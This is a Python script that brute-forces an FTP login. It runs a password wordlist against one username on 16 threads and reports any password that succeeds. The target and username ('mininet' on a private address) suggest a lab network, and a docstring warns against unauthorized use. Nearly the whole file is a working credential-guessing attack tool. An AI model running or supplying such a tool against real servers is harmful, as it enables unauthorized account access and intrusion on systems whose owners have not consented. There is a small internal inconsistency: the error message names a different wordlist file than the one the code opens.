"""
Multithreaded FTP Brute-Force Script

This script attempts to brute-force an FTP login using a provided username 
and a list of commonly used passwords. 

Do not use outside of controlled environments or without authorization.

Usage: python3 ftp_bruteforce.py
"""

import sys
import os
import time
import ftplib
import concurrent.futures


def ftp_login(host, username, password):
    try:
        with ftplib.FTP(host) as ftp:
            ftp.login(username, password)
            print(f"[SUCCESS] Password found: {password}")
            return True
    except ftplib.error_perm as e:
        print(f"[FAILED] {e}")  # Affiche l'erreur exacte
        return False


def main():
    server_ip = "10.12.0.40"
    username = "mininet"
    wordlist_file = "common.txt"

    # Check if the wordlist exists
    if not os.path.exists(wordlist_file):
        print("\n[ERROR] Wordlist file 'most-common.txt' not found in the current directory.")
        sys.exit(1)

    print(f"[INFO] Starting FTP brute-force attack on {server_ip} using username: '{username}'")
    start_time = time.time()

    with open(wordlist_file, 'r') as file:
        passwords = file.readlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
        future_tasks = []

        for pwd in passwords:
            password = pwd.strip()
            print(f"[TRY] Attempting login with password: '{password}'")
            future = executor.submit(ftp_login, server_ip, username, password)
            future_tasks.append(future)

        for future in concurrent.futures.as_completed(future_tasks):
            if future.result():
                executor.shutdown(wait=False)
                print(f"[INFO] Elapsed time: {time.time() - start_time:.2f} seconds")
                sys.exit(0)

    print("[INFO] No valid password found.")
    print(f"[INFO] Elapsed time: {time.time() - start_time:.2f} seconds")


if __name__ == '__main__':
    main()
